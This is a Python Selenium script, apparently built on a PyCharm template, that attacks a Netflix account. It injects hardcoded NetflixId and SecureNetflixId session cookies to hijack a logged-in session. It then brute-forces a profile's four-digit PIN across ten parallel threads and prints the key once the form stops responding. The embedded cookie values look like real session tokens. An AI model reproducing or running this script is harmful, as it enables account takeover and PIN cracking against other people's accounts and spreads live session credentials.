# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import threading
import time

from selenium import webdriver


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


def run_selenium(x, z):
    driver = webdriver.Edge(executable_path="./msedgedriver.exe")
    # driver.minimize_window()
    driver.get("https://www.netflix.com/404Notfound")
    cookies = driver.get_cookies()
    domain = ""

    for cookie in cookies:

        if "NetflixId" == cookie["name"]:
            cookie[
                "value"] = "ct%3DBQAOAAEBEG-qzjTkwVnLwUtJpKGDCASB8M7y1Vdn4aPlF61Iu_EQqU8fevMj2nLBl4lbMDe6lOxGsIfYd8bKjS-YwxdliY7DXoMeakxX1sWcWo5NLnXnSATpLVSbhMQzkWSPaOtlwTkaZRQGOQRHOymDsuIFdbyI4AZrb2o2q6WojDDK8Pd1u4ToXtdpIPzZMnM9kW_3G5jHykOxMq1rWg5IYOo7G-Bk5mvx7Wj3nrvIqrpWiEGaA_UuqMjq-i_1zJ1RonUYKAMcVoPTef71eQlWB3cVIPfs9dtZdRzgcFoOpvqfFXHBbwbB6HuEMu9pT5IaZ25ERtkUIfp9QAjvVxfJebKxx-EBg5C5L7g_DQXVtvcOuC4fMIItvLJz8CQb-iWlGlO1Yi2Xxk2dYOGC1JHLi998amYKsB4nPjCwfXwdwb_mYSz3-tpe6w6YQFoDbOEc9St30qqsK5cMBfPPQjjaX8XET-4ipCD_4QHZbNgXRonkUU-cYXUn62ySOGRMN59fyDJlEsKiYeirdqnOydX9pwhxXpYCs4n6BdkADy6ySLpzdBh1vN94gLQWv5P2_nIu_EsgGnG0GZ1iMKk4131FNyXwSjeG_EOX_XKpPdgozYdV4enV4NbTdjfbZLpP1QBs3WELsuzrDW8Kvk6x3Gqne6-oEX2GLUtYmeCJd_UqNEE7gM13G5w.%26bt%3Ddbl%26ch%3DAQEAEAABABSDKIyp7dyjAXz44uNIwSsYWmb5ACioPwc.%26v%3D2%26mac%3DAQEAEAABABSyd25aqBNylU1NxYAsKy5RQbQlZYSmNd4."
            driver.add_cookie(cookie)
            continue
        if "SecureNetflixId" == cookie["name"]:
            cookie["value"] = "v%3D2%26mac%3DAQEAEQABABSg61nK1jhFZbLeUMCLtnGHXpgsgojQ83Y.%26dt%3D1618234256029"
            driver.add_cookie(cookie)
            continue

    driver.get("https://www.netflix.com/browse")
    time.sleep(1)
    driver.find_element_by_xpath(
        "/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div/ul/li[2]/div/a/div/div").click()
    time.sleep(1)
    for i in range(x, z):
        for j in range(0, 10):
            for k in range(0, 10):
                for l in range(0, 10):

                    try:

                        driver.find_element_by_xpath(
                            "/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[1]").send_keys(i)
                        #
                        driver.find_element_by_xpath(
                            "/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[2]").send_keys(j)
                        #
                        driver.find_element_by_xpath(
                            "/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[3]").send_keys(k)
                        #
                        driver.find_element_by_xpath(
                            "/html/body/div[1]/div/div/div[1]/div[1]/div[2]/div/div[3]/div/input[4]").send_keys(l)
                        time.sleep(1)

                    except:
                        print("Key is: " + str(i) + str(j) + str(k) + str(l) + "-1")

                        return

    time.sleep(1)
    driver.close()


# Press the green button in the gutter to run the script.
if __name__ == '__main__':

    t1 = threading.Thread(target=run_selenium, args=(0, 1))
    t2 = threading.Thread(target=run_selenium, args=(1, 2))
    t3 = threading.Thread(target=run_selenium, args=(2, 3))
    t4 = threading.Thread(target=run_selenium, args=(3, 4))
    t5 = threading.Thread(target=run_selenium, args=(4, 5))
    t6 = threading.Thread(target=run_selenium, args=(5, 6))
    t7 = threading.Thread(target=run_selenium, args=(6, 7))
    t8 = threading.Thread(target=run_selenium, args=(7, 8))
    t9 = threading.Thread(target=run_selenium, args=(8, 9))
    t0 = threading.Thread(target=run_selenium, args=(9, 10))
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()
    t0.start()

    # run_selenium(0, 2)
# See PyCharm help at https://www.jetbrains.com/help/pycharm/
